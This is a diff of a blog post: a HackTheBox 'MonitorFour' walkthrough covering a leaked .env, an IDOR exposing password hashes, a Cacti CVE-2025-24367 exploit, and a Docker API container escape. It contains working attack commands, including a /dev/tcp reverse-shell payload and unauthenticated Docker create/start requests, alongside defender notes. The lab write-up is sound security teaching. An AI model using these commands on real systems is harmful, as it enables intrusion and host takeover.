@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HackTheBox: MonitorFour — Satej Chaudhari</title>
-  <meta name="description" content="HackTheBox MonitorFour walkthrough — a Cacti vhost, a leaked .env and an IDOR expose user hashes, CVE-2025-24367 gives an in-container shell, and an exposed Docker Engine API on the host is abused to escape to root.">
+  <meta name="description" content="In-depth HackTheBox MonitorFour walkthrough — a Cacti vhost, a leaked .env and an IDOR expose user hashes, CVE-2025-24367 gives an in-container shell, and an exposed Docker Engine API on the host is abused to escape to root, with defender notes throughout.">
 
   <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
 
@@ -61,132 +61,206 @@
         <h1 class="post-title">HackTheBox: MonitorFour</h1>
         <p class="post-meta">
           <time datetime="2026-10-02">2026-10-02</time>
-          <span>&middot; 9 min read</span>
+          <span>&middot; 12 min read</span>
         </p>
       </header>
 
       <div class="post-body">
 
-        <p><strong>MonitorFour</strong> is a Windows box. The foothold comes from a Cacti instance reached through a vhost: a leaked <code>.env</code> and an IDOR on <code>/user</code> expose user hashes, one cracks, and <strong>CVE-2025-24367</strong> turns an authenticated Cacti session into code execution. The shell lands in a container, and an exposed Docker Engine API on the host is used to break out to root.</p>
+        <p><strong>MonitorFour</strong> is a Windows box with a web-to-container-to-host theme. The web tier leaks its own database configuration and exposes an authorisation flaw that hands over user password hashes; one of those cracks and unlocks a vulnerable Cacti instance, where a recent CVE gives code execution. That shell lands inside a Docker container, and the final move is a classic container breakout: the host's Docker Engine API is listening unauthenticated, so we tell it to build us a container that mounts the host and runs a shell as root.</p>
+
+        <h2>Attack chain at a glance</h2>
+
+        <ul>
+          <li><strong>Recon</strong> — HTTP (80) and WinRM (5985) on a Windows host; a <code>cacti</code> virtual host behind the main site.</li>
+          <li><strong>Info leak</strong> — an exposed <code>.env</code> file (<a href="../vuln-detail.html?vuln=secrets-exposure">secrets exposure</a>) and an <a href="../vuln-detail.html?vuln=idor">IDOR</a> on <code>/user?token=</code> that dumps every user record, MD5 password hashes included.</li>
+          <li><strong>Crack</strong> — the admin MD5 falls to rockyou in under a second.</li>
+          <li><strong>Foothold</strong> — <strong>CVE-2025-24367</strong> turns the authenticated Cacti session into arbitrary PHP write + execution; shell as <code>www-data</code> inside a container; user flag.</li>
+          <li><strong>Root</strong> — the host's Docker Engine API is exposed on <code>2375</code> with no TLS or auth; create a container binding the host filesystem and run a reverse shell as root.</li>
+        </ul>
 
         <h2>Reconnaissance</h2>
 
-        <p>Two ports stand out — a web server and WinRM — on a Windows host.</p>
+        <p>Only two ports answer, but they tell a story on their own: a bare <code>nginx</code> on 80 and WinRM on 5985, with service detection calling the host Windows. WinRM being open is a note for later — if we ever recover a Windows credential, that is a ready-made remote shell.</p>
 
         <pre><code>nmap -Pn 10.129.174.167 -p80,5985 -sCV
 
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    nginx
-5985/tcp open  http    Microsoft HTTPAPI httpd 2.0
-Service Info: OS: Windows</code></pre>
+|_http-title: MonitorsFour - Networking Solutions
+| http-cookie-flags:
+|_  /: PHPSESSID: httponly flag not set
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
 
-        <p>Add <code>monitorsfour.htb</code> to <code>/etc/hosts</code>, then fuzz for virtual hosts.</p>
+        <p>The <code>PHPSESSID</code> cookie shows the app is PHP. Add the hostname, then fuzz for virtual hosts — many real deployments route several apps through one nginx by <code>Host</code> header, and HackTheBox leans on this constantly.</p>
 
-        <pre><code>ffuf -u http://monitorsfour.htb/ -H &quot;Host: FUZZ.monitorsfour.htb&quot; \
-  -w .../subdomains-top1million-5000.txt -fs 138
+        <pre><code>echo &quot;10.129.174.167 monitorsfour.htb&quot; | sudo tee -a /etc/hosts
 
-cacti   [Status: 302, Size: 0]</code></pre>
+ffuf -u http://monitorsfour.htb/ -H &quot;Host: FUZZ.monitorsfour.htb&quot; \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 138
 
-        <p>A <code>cacti</code> vhost appears (add it to <code>/etc/hosts</code> too). It runs a vulnerable version of Cacti with a login page; the unauthenticated PoC fails, so credentials are needed. Content fuzzing the main site is more productive:</p>
+cacti   [Status: 302, Size: 0, Words: 1, Lines: 1]</code></pre>
 
-        <pre><code>ffuf -u http://monitorsfour.htb/FUZZ -w .../common.txt
+        <p>The <code>-fs 138</code> filter drops the default-page size so only genuinely different responses show through — and <code>cacti</code> surfaces. Add <code>cacti.monitorsfour.htb</code> to <code>/etc/hosts</code> as well. Cacti is an open-source network-monitoring front end; the version here is old enough to have public exploits, but both of the ones worth trying need a valid login first. So the immediate objective becomes: find credentials.</p>
 
-.env             [200]
-controllers      [301]
-forgot-password  [200]
-login            [200]
-user             [200]
-views            [301]</code></pre>
+        <h2>Information disclosure — .env and an IDOR</h2>
 
-        <p>The exposed <code>.env</code> leaks the database configuration:</p>
+        <p>Content discovery on the main application is where the box opens up:</p>
 
-        <pre><code>DB_HOST=mariadb
+        <pre><code>ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+.env             [Status: 200, Size: 97]
+contact          [Status: 200]
+controllers      [Status: 301]
+forgot-password  [Status: 200]
+login            [Status: 200]
+user             [Status: 200, Size: 35]
+views            [Status: 301]</code></pre>
+
+        <p>A readable <code>.env</code> is a textbook <a href="../vuln-detail.html?vuln=secrets-exposure">secrets-exposure</a> finding — framework environment files routinely hold database and API credentials and should never sit under the web root:</p>
+
+        <pre><code>curl http://monitorsfour.htb/.env
+
+DB_HOST=mariadb
 DB_PORT=3306
 DB_NAME=monitorsfour_db
 DB_USER=monitorsdbuser
 DB_PASS=f37p2j8f4t0r</code></pre>
 
-        <h2>IDOR on /user → hashes</h2>
+        <p>That database is only reachable from inside the host for now, so park the credential and keep enumerating. The <code>/user</code> endpoint returned a tiny 35-byte body — suspiciously like a stub waiting for a parameter. Fuzzing parameter <em>names</em> against it finds one:</p>
 
-        <p>Parameter fuzzing <code>/user</code> reveals a <code>token</code> parameter.</p>
-
-        <pre><code>ffuf -u &quot;http://monitorsfour.htb/user?FUZZ=key&quot; -w .../burp-parameter-names.txt -fs 35
+        <pre><code>ffuf -u &quot;http://monitorsfour.htb/user?FUZZ=key&quot; \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 35
 
 token   [Status: 200, Size: 36]</code></pre>
 
-        <p>Supplying a guessable token value dumps user records — including MD5 password hashes — straight out of the database:</p>
+        <p>Now the real flaw. The endpoint takes a <code>token</code> but never checks whether the token belongs to the caller — supplying a throwaway value returns the full user table. This is a classic <a href="../vuln-detail.html?vuln=idor">Insecure Direct Object Reference</a>: an object (every user's record) is served purely on the strength of a reference we control, with no authorisation on top.</p>
 
         <pre><code>curl &quot;http://monitorsfour.htb/user?token=0&quot;
 
 [{&quot;id&quot;:2,&quot;username&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;admin@monitorsfour.htb&quot;,
   &quot;password&quot;:&quot;56b32eb43e6f15395f6c46c1c9e1cd36&quot;,&quot;role&quot;:&quot;super user&quot;,
-  &quot;name&quot;:&quot;Marcus Higgins&quot;,&quot;position&quot;:&quot;System Administrator&quot;...},
- ...mwatson, janderson, dthompson... ]</code></pre>
+  &quot;token&quot;:&quot;8024b78f83f102da4f&quot;,&quot;name&quot;:&quot;Marcus Higgins&quot;,
+  &quot;position&quot;:&quot;System Administrator&quot;,...},
+ {&quot;id&quot;:5,&quot;username&quot;:&quot;mwatson&quot;,&quot;password&quot;:&quot;69196959c16b26ef00b77d82cf6eb169&quot;,...},
+ {&quot;id&quot;:6,&quot;username&quot;:&quot;janderson&quot;,&quot;password&quot;:&quot;2a22dcf99190c322d974c8df5ba3256b&quot;,...},
+ {&quot;id&quot;:7,&quot;username&quot;:&quot;dthompson&quot;,&quot;password&quot;:&quot;8d4a7e7fd08555133e056d9aacb1e519&quot;,...}]</code></pre>
 
-        <p>The admin hash is a plain MD5 and cracks instantly:</p>
+        <p>Those 32-hex-character passwords are unsalted MD5 — fast to crack. Several of the <code>mwatson</code>/<code>janderson</code> hashes even start with <code>0e</code>, the giveaway of PHP magic-hash / type-juggling bait, but the admin's is the one that matters:</p>
 
-        <pre><code>hashcat -m 0 56b32eb43e6f15395f6c46c1c9e1cd36 rockyou.txt
+        <pre><code>hashcat -m 0 56b32eb43e6f15395f6c46c1c9e1cd36 /usr/share/wordlists/rockyou.txt
 
-56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1</code></pre>
+56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
+Status...........: Cracked</code></pre>
 
-        <figure>
-          <img src="../assets/img/htb-monitorfour/img1.png" alt="Logging in to Cacti with the cracked administrator credentials">
-          <figcaption>Authenticated to Cacti as the administrator (<code>marcus</code> / <code>wonderful1</code>).</figcaption>
-        </figure>
-
-        <h2>Foothold — CVE-2025-24367</h2>
-
-        <p>With a valid Cacti login, <strong>CVE-2025-24367</strong> is used to write PHP files and gain execution.</p>
+        <p>Mode <code>0</code> is raw MD5. The crack is instant — <code>wonderful1</code> — and the record ties the admin account to the display name <code>Marcus</code>, which is what Cacti expects as a username.</p>
 
         <figure>
-          <img src="../assets/img/htb-monitorfour/img2.png" alt="The CVE-2025-24367 Cacti exploit">
-          <figcaption>The public CVE-2025-24367 exploit against the Cacti instance.</figcaption>
+          <img src="../assets/img/htb-monitorfour/img1.png" alt="Logging in to Cacti as the administrator with the cracked password">
+          <figcaption>Authenticated to Cacti as the administrator (<code>marcus</code> / <code>wonderful1</code>). An authenticated session is the precondition for the exploit.</figcaption>
         </figure>
 
-        <pre><code>python3 exploit.py -u marcus -p wonderful1 \
-  -i 10.10.14.11 -l 4444 -url http://cacti.monitorsfour.htb
+        <h2>Foothold — CVE-2025-24367 (Cacti authenticated RCE)</h2>
+
+        <p>CVE-2025-24367 abuses Cacti's custom-graph / template handling: an authenticated user can get the application to create attacker-controlled PHP files under the web root, which then execute. In other words, the login we just earned is the key, and the CVE turns it into code execution. The public PoC automates the whole dance — log in, create the graph, write the PHP stager, trigger it.</p>
+
+        <figure>
+          <img src="../assets/img/htb-monitorfour/img2.png" alt="The CVE-2025-24367 exploit script running against the Cacti instance">
+          <figcaption>The public CVE-2025-24367 exploit — it logs in, writes PHP under the web root, and triggers the callback.</figcaption>
+        </figure>
+
+        <pre><code>python3 exploit.py \
+  -u marcus -p wonderful1 \
+  -i 10.10.14.11 -l 4444 \
+  -url http://cacti.monitorsfour.htb
 
 [+] Cacti Instance Found!
+[+] Serving HTTP on port 80
 [+] Login Successful!
 [+] Got graph ID: 226
+[i] Created PHP filename: zhiwh.php
+[+] Got payload: /bash
 [+] Hit timeout, looks good for shell, check your listener!</code></pre>
 
         <pre><code>nc -nlvp 4444
-connect to [10.10.14.11] from (UNKNOWN) [10.129.174.167]
+listening on [any] 4444 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.129.174.167] 50092
+bash: cannot set terminal process group (8): Inappropriate ioctl for device
 www-data@821fbd6a43fa:~/html/cacti$</code></pre>
 
-        <p>The user flag sits in <code>marcus</code>'s home directory:</p>
+        <p>The <code>www-data</code> user and the hex hostname <code>821fbd6a43fa</code> are the first hint that this is not the real host but a container. Either way, the user flag is right here:</p>
 
-        <pre><code>www-data@821fbd6a43fa:/home/marcus$ cat user.txt</code></pre>
+        <pre><code>www-data@821fbd6a43fa:/home$ ls
+marcus
+www-data@821fbd6a43fa:/home$ cat marcus/user.txt</code></pre>
 
-        <h2>Container escape → root</h2>
+        <h2>Mapping the container</h2>
 
-        <p>The hostname and <code>uname</code> make it clear this is a container on a WSL2 Docker host. Enumeration of <code>/etc/resolv.conf</code> reveals the host's address, and the Docker Engine API is exposed there, unauthenticated, on port 2375:</p>
+        <p>Before reaching for kernel exploits, characterise the environment — half the privilege-escalation battle on containerised boxes is realising you are in a container and asking what the container can see of its host:</p>
 
-        <pre><code># /etc/resolv.conf -&gt; # ExtServers: [host(192.168.65.7)]
+        <pre><code>uname -a
+# Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 ...   &lt;- WSL2 Docker host
+
+mount | grep cgroup
+# cgroup on /sys/fs/cgroup type cgroup2 (ro,...)
+
+ip route show | grep default
+# default via 172.18.0.1 dev eth0            &lt;- Docker bridge gateway
+
+ss -tulnp
+# only 80 (nginx) and 9000 (PHP-FPM) listening internally</code></pre>
+
+        <p>The kernel string <code>microsoft-standard-WSL2</code> says the Docker host is Docker Desktop on Windows via WSL2. The most useful file is <code>/etc/resolv.conf</code>, which Docker Desktop annotates with the host's internal address:</p>
+
+        <pre><code>cat /etc/resolv.conf
+# Generated by Docker Engine.
+# ExtServers: [host(192.168.65.7)]      &lt;- the host, reachable from the container
 
 curl http://192.168.65.7:2375/version
-{&quot;Platform&quot;:{&quot;Name&quot;:&quot;Docker Engine - Community&quot;},&quot;Version&quot;:&quot;28.3.2&quot;,...}</code></pre>
+{&quot;Platform&quot;:{&quot;Name&quot;:&quot;Docker Engine - Community&quot;},&quot;Version&quot;:&quot;28.3.2&quot;,
+ &quot;ApiVersion&quot;:&quot;1.51&quot;,&quot;Os&quot;:&quot;linux&quot;,&quot;Arch&quot;:&quot;amd64&quot;, ...}</code></pre>
 
-        <blockquote>An exposed Docker API is root on the host by design: you can create a container that mounts the host filesystem and runs anything. Useful read-only endpoints for recon include <code>/info</code>, <code>/images/json</code> and <code>/containers/json</code>; the create/start pair below is what actually escapes.</blockquote>
+        <p>That reply is the whole game. TCP <code>2375</code> is the Docker Engine REST API in its <em>plaintext, unauthenticated</em> form (the TLS port is 2376). Anyone who can reach it can drive the daemon, and the daemon runs as root on the host.</p>
 
-        <p>Create a container that binds the host's <code>C:</code> drive and runs a reverse shell, then start it:</p>
+        <h2>Root — abusing the exposed Docker Engine API</h2>
+
+        <blockquote>Access to the Docker daemon is equivalent to root on its host, by design — the API can create a container that bind-mounts the entire host filesystem, so even an unprivileged attacker who can talk to <code>2375</code> owns the box. Read-only endpoints worth a glance for recon are <code>/info</code>, <code>/images/json</code> (pick an image that already exists) and <code>/containers/json</code>; the breakout itself is just a <code>create</code> + <code>start</code>.</blockquote>
+
+        <p>Build a container-create request that reuses an image already present on the host, binds the host's <code>C:</code> drive in, and sets the command to a reverse shell:</p>
 
         <pre><code>cat &lt;&lt; &#x27;EOF&#x27; &gt; config.json
 {
   &quot;Image&quot;: &quot;docker_setup-nginx-php:latest&quot;,
   &quot;Cmd&quot;: [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.11/4445 0&gt;&amp;1&quot;],
-  &quot;HostConfig&quot;: { &quot;Binds&quot;: [&quot;/mnt/host/c:/host_root&quot;] }
+  &quot;HostConfig&quot;: {
+    &quot;Binds&quot;: [&quot;/mnt/host/c:/host_root&quot;]
+  }
 }
 EOF
 
 curl -H &#x27;Content-Type: application/json&#x27; -d @config.json \
   http://192.168.65.7:2375/containers/create -o response.json
+cat response.json      # note the &quot;Id&quot; returned
+
 curl -X POST http://192.168.65.7:2375/containers/&lt;ID&gt;/start</code></pre>
 
-        <p>A listener catches the root shell, and the root flag is readable from the bound host filesystem.</p>
+        <p>Start a listener on <code>4445</code> first; the moment the container starts, its command runs as root and connects back. Because <code>/mnt/host/c</code> (the host's <code>C:</code> under WSL) is bind-mounted into the new container, the root flag and anything else on the host is readable from inside it.</p>
 
-        <blockquote>Lesson: never bind the Docker socket or expose <code>2375</code> without TLS and auth — API access is equivalent to root on the host, container boundary or not.</blockquote>
+        <pre><code>nc -nlvp 4445
+connect to [10.10.14.11] from (UNKNOWN) [10.129.174.167]
+root@&lt;new-container&gt;:/#  cat /host_root/Users/Administrator/Desktop/root.txt</code></pre>
+
+        <h2>Defender's notes</h2>
+
+        <ul>
+          <li>Keep framework env files (<code>.env</code>) and config out of the web root, and make sure the server refuses to serve dotfiles.</li>
+          <li>Enforce authorisation on every object-returning endpoint — a <code>token</code> is authentication material, not an access-control decision. Bind each request to the authenticated principal and check ownership (the core of fixing an <a href="../vuln-detail.html?vuln=idor">IDOR</a>).</li>
+          <li>Store passwords with a slow, salted algorithm (bcrypt/argon2), never raw MD5.</li>
+          <li>Patch Cacti; CVE-2025-24367 is fixed in current releases.</li>
+          <li>Never expose the Docker API on <code>2375</code> without mutual TLS, and never reachable from a workload container. Treat daemon access as host root.</li>
+        </ul>
 
       </div>
     </article>
